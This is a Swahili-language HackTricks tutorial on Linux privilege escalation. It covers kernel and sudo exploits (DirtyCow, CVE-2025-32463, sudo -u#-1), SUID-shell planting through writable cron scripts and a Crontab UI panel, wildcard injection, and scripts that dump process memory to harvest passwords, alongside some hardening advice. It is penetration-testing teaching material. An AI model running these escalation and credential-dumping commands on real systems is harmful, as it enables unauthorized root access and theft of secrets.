# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

Kwa maelezo mapana zaidi na mbinu za kihistoria za ukusanyaji wa taarifa, linganisha rasilimali za g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation, na linux-private-i zilizoorodheshwa kwenye marejeo.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Taarifa za Mfumo

### Taarifa za OS

Tuanze kupata maarifa kuhusu OS inayoendesha mfumo.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Njia

Ikiwa una **ruhusa za kuandika kwenye folda yoyote ndani ya kigezo cha `PATH`**, unaweza kuteka nyara baadhi ya maktaba au binary:

```bash
echo $PATH
```

### Taarifa za mazingira

Taarifa za kuvutia, nywila au API keys kwenye variables za mazingira?

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

Angalia toleo la kernel na kama kuna exploit inayoweza kutumika kuongeza privileges.

Sehemu ya [Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) inakusanya visa vya local privilege escalation na viungo vya maandishi ya kina zaidi kuhusu Linux kernel katika Binary Exploitation. Thibitisha build na usanidi unaoathiriwa kabla ya kujaribu kisa.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Unaweza kupata orodha nzuri ya kernel zenye udhaifu na baadhi ya **compiled exploits** hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Tovuti nyingine ambako unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote ya kernel yenye udhaifu kutoka kwenye tovuti hiyo, unaweza kufanya hivi:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Zana zinazoweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (itekeleze KWENYE victim; hukagua exploits za kernel 2.x pekee)

Tafuta **toleo la kernel kwenye Google** kila wakati. Huenda toleo la kernel yako limeandikwa kwenye kernel exploit fulani, na hivyo utahakikisha kuwa exploit hiyo inafanya kazi.

Mbinu za ziada za kernel exploitation:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Toleo la Sudo

Kulingana na matoleo hatarishi ya sudo yaliyoorodheshwa katika:

```bash
searchsploit sudo
```

Unaweza kuangalia ikiwa toleo la sudo lina udhaifu kwa kutumia grep hii.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

sudo **1.9.14 hadi 1.9.17** ya upstream huruhusu watumiaji wa ndani wasio na ruhusa za juu kupandisha ruhusa hadi root kupitia chaguo la `--chroot` wakati sudo inapakia `/etc/nsswitch.conf` kutoka kwenye saraka inayodhibitiwa na mtumiaji; upstream ilirekebisha hili katika **1.9.17p1**. Kagua kila binary ya sudo inayoweza kutekelezwa na yenye root-setuid katika njia husika, kwa kuwa `sudo -V` huripoti binary iliyochaguliwa na `PATH` pekee. Vifurushi vya usambazaji vinaweza kujumuisha marekebisho kutoka matoleo mapya bila kubadilisha mfuatano wa toleo la upstream, kwa hiyo hakiki pia hali ya kifurushi cha vendor. Tazama [ushauri wa msimamizi wa sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Hii hapa [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) ya kutumia [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) hiyo. Kabla ya kuendesha exploit, hakikisha toleo lako la `sudo` lina vulnerability hiyo na linatumia kipengele cha `chroot`.  

Kwa maelezo zaidi, rejelea [ushauri wa awali kuhusu vulnerability](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Sudo: kukwepa sheria za sudo zinazotegemea host (CVE-2025-32462)

sudo **1.8.8 hadi 1.9.17** ya upstream inaweza kutathmini sheria za sudoers zinazotegemea host kwa kutumia **jina la host lililotolewa na mtumiaji** kupitia `sudo -h <host>` badala ya **jina halisi la host**; upstream ilirekebisha hili katika **1.9.17p1**. Mtumiaji bado lazima awe na ingizo linalolingana la sudoers kwenye host iliyochaguliwa. Kagua marekebisho yaliyojumuishwa na vendor na binary mbadala za sudo, pamoja na sera ya ndani. Tazama [ushauri wa msimamizi wa sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Mahitaji:
- Toleo la sudo lenye vulnerability
- Sheria za sudoers zinazohusu host maalum (host si jina la sasa la host wala `ALL`)

Mfano wa muundo wa sudoers:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploit kwa kufanya spoofing ya host inayoruhusiwa:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Ikiwa resolution ya jina lililochaguliwa itazuiwa, thibitisha jinsi jina hilo linavyoresolve kwenye host. Kuona jina kwenye log au faili ya usanidi pekee hakumaanishi kuwa linaweza kutatuliwa, na kubadilisha `/etc/hosts` kwa kawaida kunahitaji ruhusa za kuandika zenye privileged.

#### sudo < v1.8.28

Hii [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) inahitaji kanuni ya sudo inayotumika na inayoruhusu kutekeleza amri kama watumiaji `ALL` huku ikimzuia root, kama vile `(ALL, !root) /bin/bash`. Mtumiaji anayeanzisha amri lazima pia aruhusiwe kutumia kanuni hiyo, ikijumuisha sharti lolote la uthibitishaji. Kagua tangazo la usalama la kifurushi kilichosakinishwa: wauzaji waliweka marekebisho kwenye matoleo ambayo toleo lake linaloonyeshwa bado ni la chini ya 1.8.28. Kanuni ya `!root` au toleo la zamani pekee havithibitishi kuwa kuna hatari. Usijaribu amri yenye privileged wakati wa uchunguzi usioingilia mfumo.

```
sudo -u#-1 /bin/bash
```

### Uthibitishaji wa sahihi wa dmesg umeshindwa

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln hii inaweza ku-exploitishwa.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Ukusanyaji zaidi wa taarifa kuhusu mfumo

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Orodhesha ulinzi unaowezekana

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Ikiwa uko ndani ya container, anza na sehemu ifuatayo ya usalama wa container, kisha endelea kwenye kurasa za matumizi mabaya zinazohusu runtime mahususi:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Viendeshi

Angalia **vilivyowekwa na kuondolewa kwenye mount**, viko wapi na kwa nini. Ikiwa chochote kimeondolewa kwenye mount, unaweza kujaribu kukiweka kwenye mount na kuangalia kama kina taarifa za faragha.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Programu muhimu

Orodhesha binaries muhimu

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Pia, angalia kama **compiler yoyote imesakinishwa**. Hii ni muhimu ikiwa unahitaji kutumia kernel exploit, kwani inapendekezwa kuikompile kwenye mashine utakayoitumia (au kwenye mashine inayofanana nayo).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Programu Hatarishi Zilizosakinishwa

Angalia **toleo la vifurushi na huduma zilizosakinishwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kutumiwa vibaya ili kupata haki za juu…\
Inapendekezwa kuangalia mwenyewe toleo la programu zinazotiliwa shaka zaidi kati ya zilizosakinishwa.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Ikiwa una ufikiaji wa SSH kwenye mashine, unaweza pia kutumia **openVAS** kuangalia kama kuna programu zilizopitwa na wakati na zilizo hatarini zilizosakinishwa ndani ya mashine.

> [!NOTE] > _Kumbuka kuwa amri hizi zitaonyesha taarifa nyingi ambazo nyingi hazitakuwa na manufaa, kwa hiyo inapendekezwa kutumia baadhi ya programu kama OpenVAS au zinazofanana nayo, ambazo zitaangalia kama toleo lolote la programu iliyosakinishwa liko hatarini kwa exploits zinazojulikana_

## Michakato

Angalia **ni michakato gani** inayoendeshwa na uangalie kama kuna mchakato wowote wenye **privileges nyingi kuliko inavyopaswa** (labda tomcat inayoendeshwa na root?)

```bash
ps aux
ps -ef
top -n 1
```

Kagua kila mara ikiwa kuna [**electron/cef/chromium debuggers** zinazoendeshwa, unaweza kuzitumia vibaya ili kupata privileges za juu](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** huzitambua kwa kuangalia parameter ya `--inspect` ndani ya command line ya process.\
Pia **kagua privileges zako juu ya binaries za processes**, huenda ukaweza kubadilisha binary ya mtu mwingine.

### Minyororo ya parent-child kati ya watumiaji tofauti

Process ya child inayoendeshwa na **mtumiaji tofauti** na parent wake si lazima iwe hasidi, lakini ni **ishara muhimu kwa triage**. Baadhi ya mabadiliko haya yanatarajiwa (`root` kuanzisha service user, login managers kuunda session processes), lakini minyororo isiyo ya kawaida inaweza kufichua wrappers, debug helpers, persistence, au mipaka dhaifu ya uaminifu wa runtime.

Ukaguzi wa haraka:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Ukikuta mlolongo wa matukio unaoshangaza, kagua command line ya mchakato mzazi na faili zote zinazoathiri utendaji wake (`config`, `EnvironmentFile`, skripti saidizi, working directory, na arguments zinazoweza kuandikwa). Katika njia kadhaa halisi za privesc, mchakato mtoto wenyewe haukuweza kuandikwa, lakini **config inayodhibitiwa na mzazi** au mlolongo wa skripti saidizi ungeweza.

### Executable zilizofutwa na faili zilizofutwa lakini bado wazi

Mabaki ya runtime mara nyingi bado yanaweza kufikiwa **hata baada ya kufutwa**. Hii ni muhimu kwa privilege escalation na pia kurejesha ushahidi kutoka kwa mchakato ambao tayari umefungua faili nyeti.

Angalia executable zilizofutwa:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Ikiwa `/proc/<PID>/exe` inaonyesha `(deleted)`, mchakato bado unaendesha taswira ya zamani ya binary kutoka kwenye kumbukumbu. Hii ni ishara muhimu ya kuchunguza kwa sababu:

- executable iliyoondolewa inaweza kuwa na mifuatano au credentials zinazovutia
- mchakato unaoendelea unaweza bado kufichua file descriptors zenye manufaa
- binary ya upendeleo wa juu iliyoondolewa inaweza kuashiria uchezewaji wa hivi karibuni au jaribio la kufuta ushahidi

Kusanya faili zilizo wazi lakini zimefutwa kote kwenye mfumo:

```bash
lsof +L1
```

Ukipata descriptor ya kuvutia, irejeshe moja kwa moja:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Hii ni muhimu hasa wakati mchakato bado umefungua siri, script, hifadhi ya database, au faili ya flag iliyofutwa.

### Ufuatiliaji wa michakato

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia michakato. Hii inaweza kusaidia sana kutambua michakato iliyo katika hatari inayoendeshwa mara kwa mara au wakati seti ya masharti fulani imetimizwa.

#### Linux ProcMon chini ya sudo

[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) inaweza kufuatilia michakato na system calls zilizochaguliwa na kuhifadhi rekodi ya SQLite. Ikiwa `sudo -l` inaruhusu kutekeleza amri ya `procmon` yenye uwezo wa root bila vizuizi, fikiria kama inaweza kuona ingizo au matokeo ya mchakato wa mtumiaji mwingine. Ruhusa hiyo ni kidokezo cha kuchunguza tu: uwezo wa tracer, sera inayotumika, na shughuli za mchakato unaofaa vyote ni muhimu. Faili za rekodi zinaweza kuwa na siri, kwa hivyo kagua exports zilizoidhinishwa kwa uangalifu na uepuke kukusanya data ya michakato isiyohusika.

### Kumbukumbu ya mchakato

Baadhi ya huduma za server huhifadhi **credentials katika maandishi wazi ndani ya kumbukumbu**.\
Kwa kawaida utahitaji **ruhusa za root** ili kusoma kumbukumbu ya michakato inayomilikiwa na watumiaji wengine; kwa hiyo, hili huwa na manufaa zaidi ikiwa tayari una root na unataka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma kumbukumbu ya michakato unayomiliki**.

> [!WARNING]
> Kumbuka kwamba siku hizi mashine nyingi **haziruhusu ptrace kwa chaguo-msingi**, maana yake huwezi kufanya dump ya michakato mingine inayomilikiwa na mtumiaji wako asiye na ruhusa za juu.
>
> Faili _**/proc/sys/kernel/yama/ptrace_scope**_ hudhibiti ufikivu wa ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: michakato yote inaweza kufanyiwa debugging, mradi tu iwe na uid sawa. Hii ndiyo njia ya kawaida ambayo ptracing ilifanya kazi.
> - **kernel.yama.ptrace_scope = 1**: mchakato mzazi pekee ndio unaweza kufanyiwa debugging.
> - **kernel.yama.ptrace_scope = 2**: Admin pekee ndiye anayeweza kutumia ptrace, kwani inahitaji uwezo wa CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Hakuna mchakato unaoweza kufuatiliwa kwa ptrace. Ikishawekwa, reboot inahitajika ili kuwezesha ptracing tena.

Mchakato wa same-UID unaofungua kwa muda mfupi vault ya password unaweza kuwa mpaka tofauti wa credentials. Ufuatiliaji unaporuhusiwa, mchakato unaoendelea na unaoweza kudumpiwa unaweza kufichua password ya vault kupitia input syscalls au kumbukumbu yake, ingawa faili ya vault iliyosimbwa kwa njia fiche yenyewe inaendelea kulindwa. `ptrace_scope=0` ni sharti moja tu: credentials zinazolingana, hali ya dumpability ya lengo, Linux security modules nyingine, na muda wa uhai wa mchakato pia ni muhimu. Kuingia kwa vault kuwa login ya Unix root kunahitaji ukaguzi tofauti wa matumizi tena ya credentials. Uhesabuji wa kawaida unapaswa kuripoti sera na mchakato au njia za vault zinazoweza kuhusika, si kunasa ingizo au kuonyesha siri. Tazama [nyaraka za Yama za kernel](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) na [ukaguzi wa ufikiaji wa ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Ikiwa unaweza kufikia kumbukumbu ya huduma ya FTP (kwa mfano), unaweza kupata Heap na kutafuta credentials ndani yake.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB Script

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Kwa kitambulisho fulani cha mchakato, **maps huonyesha jinsi kumbukumbu inavyopangwa ndani ya nafasi ya anwani pepe ya mchakato huo**; pia huonyesha **ruhusa za kila eneo lililopangwa**. Faili bandia ya **mem** **hufichua kumbukumbu yenyewe ya mchakato**. Kutoka kwenye faili ya **maps** tunajua ni **maeneo gani ya kumbukumbu yanayosomeka** na offsets zake. Tunatumia maelezo haya **kutafuta maeneo yote yanayosomeka katika faili ya mem na kuyadump** kwenye faili.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` hutoa ufikiaji wa kumbukumbu **halisi** ya mfumo, si kumbukumbu pepe. Nafasi ya anwani pepe ya kernel inaweza kufikiwa kupitia /dev/kmem.\
Kwa kawaida, ni **root** na kikundi cha **kmem** pekee vinavyoweza kusoma `/dev/mem`.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump ya Linux

ProcDump ni toleo la Linux lililoundwa upya la zana ya kawaida ya ProcDump kutoka kwenye mkusanyiko wa zana za Sysinternals za Windows. Ipate kwenye [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Zana

Ili kufanya dump ya kumbukumbu ya mchakato, unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa mwenyewe mahitaji ya root na kufanya dump ya mchakato unaomilikiwa nawe
- Script A.5 kutoka [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Credentials kutoka kwenye Kumbukumbu ya Mchakato

#### Mfano wa Mwongozo

Ukigundua kuwa mchakato wa authenticator unaendeshwa:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Unaweza kufanya dump ya process (tazama sehemu zilizotangulia ili kupata njia mbalimbali za kufanya dump ya memory ya process) na kutafuta credentials ndani ya memory:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **itaiba credentials za maandishi wazi kutoka kwenye memory** na kutoka kwenye **faili zinazojulikana sana**. Inahitaji ruhusa za root ili ifanye kazi ipasavyo.

| Kipengele                                         | Jina la Process     |
| ------------------------------------------------- | -------------------- |
| Password ya GDM (Kali Desktop, Debian Desktop)    | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Miunganisho ya FTP inayotumika)           | vsftpd               |
| Apache2 (Sessions za HTTP Basic Auth zinazotumika) | apache2              |
| OpenSSH (Sessions za SSH zinazotumika - matumizi ya Sudo) | sshd:                |

#### Tafuta Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Kazi za Scheduled/Cron

### Crontab UI (alseambusher) inayoendeshwa kama root – privesc kupitia scheduler ya wavuti

Ikiwa paneli ya wavuti ya “Crontab UI” (alseambusher/crontab-ui) inaendeshwa kama root na imefungwa kwenye loopback pekee, bado unaweza kuifikia kupitia SSH local port-forwarding na kuunda kazi yenye privileges za juu ili kuongeza privileges.<sup>[[1]](#references)[[4]](#references)</sup>

Mlolongo wa kawaida
- Gundua port inayopatikana kwenye loopback pekee (kwa mfano, 127.0.0.1:8000) na Basic-Auth realm kupitia `ss -ntlp` / `curl -v localhost:8000`
- Tafuta credentials kwenye faili za uendeshaji:
  - Backups/scripts zenye `zip -P <password>`
  - systemd unit inayoonyesha `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tengeneza tunnel na uingie:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Unda kazi yenye ruhusa za juu na uiendeshe mara moja (huweka SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
Itumie:
```bash
/tmp/rootshell -p   # root shell
```

Uimarishaji
- Usiendeshe Crontab UI kama root; tumia user maalum na ruhusa za chini kabisa
- Funga kwenye localhost na pia zuia ufikiaji kwa firewall/VPN; usitumie tena passwords
- Epuka kuweka secrets ndani ya unit files; tumia secret stores au EnvironmentFile inayoweza kufikiwa na root pekee
- Washa ukaguzi/uwekaji wa logs kwa utekelezaji wa jobs unapoihitaji

Angalia kama kuna scheduled job yoyote iliyo hatarini. Labda unaweza kutumia script inayoendeshwa na root (wildcard vuln? unaweza kurekebisha files zinazotumiwa na root? kutumia symlinks? kuunda files maalum kwenye directory inayotumiwa na root?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Ikiwa `run-parts` inatumika, angalia ni majina yapi yatatekelezwa kweli:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Hii huzuia false positives. Saraka ya periodic inayoweza kuandikika ina manufaa tu ikiwa jina la payload yako linalingana na sheria za ndani za `run-parts`.

### Cron path

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Angalia kuwa mtumiaji "user" ana ruhusa za kuandika kwenye /home/user_)

Ikiwa mtumiaji root atajaribu kutekeleza amri au script ndani ya crontab hii bila kuweka path, kwa mfano: _\* \* \* \* root overwrite.sh_\
Basi, unaweza kupata root shell kwa kutumia:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron kwa kutumia script yenye wildcard (Wildcard Injection)

Ikiwa script inaendeshwa na root na ina “**\***” ndani ya command, unaweza kutumia hili kusababisha mambo yasiyotarajiwa (kama privesc). Mfano:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Ikiwa wildcard imetanguliwa na njia kama** _**/some/path/\***_ **, haiwezi kutumiwa vibaya (hata** _**./\***_ **haiwezi).**

Soma ukurasa ufuatao ili upate mbinu zaidi za kutumia wildcard vibaya:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection katika wachanganuzi wa log za cron

Bash arithmetic inaweza kutafsiri maandishi yasiyoaminika kama usemi. Katika miktadha fulani ya Bash, faharasa ya array ndani ya usemi huo inaweza kutekeleza command substitution. Ikiwa cron/parser yenye privileges itaweka maandishi ya log yanayodhibitiwa na mshambuliaji katika ulinganisho wa hesabu kama huo, substitution hiyo inaweza kutekelezwa kwa utambulisho wa parser.<sup>[[22]](#references)</sup> Hili hutegemea usemi halisi wa Bash na toleo lake; mfuatano wa `$(...)0` ulio peke yake katika variable iliyopanuliwa si, wenyewe, mfano wa kuaminika wa kutathminiwa upya.

Ingizo linaweza pia kutoka kwenye metadata ya faili au sehemu nyingine inayosomwa kutoka eneo linaloweza kuandikiwa na mtumiaji. Kwa mfano, script ya usafishaji yenye privileges inayosoma tag ya picha ya `Producer` na kuilinganisha kwa kutumia `[[ "$producer" -eq "expected" ]]` hufanya ulinganisho wa hesabu, ingawa variable imewekwa ndani ya alama za kunukuu. Fuatilia utambulisho unaotumika kwa kazi iliyopangwa, faili zinazoweza kutoa tag hiyo, mabadiliko yoyote yanayofanywa kabla ya ulinganisho, na tabia halisi ya Bash. Kwa lebo za maandishi, tumia ulinganisho wa string; kwa nambari, thibitisha kuwa ingizo lina tarakimu za desimali pekee kabla ya kufanya hesabu. Tazama [sheria za hesabu za Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Muundo wa kawaida ulio hatarini:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Uchunguzi salama wa ndani wa tabia ya utaratibu wa array-subscript (hakuna mchakato wenye haki za juu wala mabadiliko ya faili):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Fuatilia script halisi iliyoratibiwa na njia halisi ya ingizo inayofungua. Hata kama faili ya logi haiwezi kuandikwa, mtumiaji anayeweza kuandika na kupita kwenye folda yake mama isiyo na sticky bit anaweza kubadilisha ingizo lake; `namei -l` husaidia kutofautisha ruhusa hizo. Njia nyingine ya logi inayoweza kuandikwa, scheduler isiyosomeka, au parser ambayo haiichukulii kamwe sehemu hiyo kama hesabu za Bash hakuthibitishi kuwepo kwa njia hii.

### Kuandika upya script ya Cron na symlink

Ikiwa **unaweza kurekebisha script ya Cron** inayoendeshwa na root, unaweza kupata shell kwa urahisi sana:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Ikiwa script inayotekelezwa na root inatumia **directory ambayo una ufikiaji kamili**, huenda ikafaa kufuta folda hiyo na **kuunda folda ya symlink inayoelekeza kwenye nyingine** inayotoa script unayoidhibiti.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Uthibitishaji wa symlink na ushughulikiaji salama zaidi wa faili

Unapokagua scripts/binaries zenye ruhusa za juu zinazosoma au kuandika faili kwa kutumia path, hakikisha jinsi link zinavyoshughulikiwa:

- `stat()` hufuata symlink na kurudisha metadata ya lengwa.
- `lstat()` hurudisha metadata ya link yenyewe.
- `readlink -f` na `namei -l` husaidia kutatua lengwa la mwisho na kuonyesha ruhusa za kila sehemu ya path.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Kwa watetezi/waendelezaji, mbinu salama zaidi dhidi ya hila za symlink ni pamoja na:

- `O_EXCL` pamoja na `O_CREAT`: shindwa ikiwa njia tayari ipo (huzuia link/faili ambazo mshambuliaji ameunda mapema).
- `openat()`: fanya kazi kwa kutumia njia inayohusiana na file descriptor ya saraka inayoaminika.
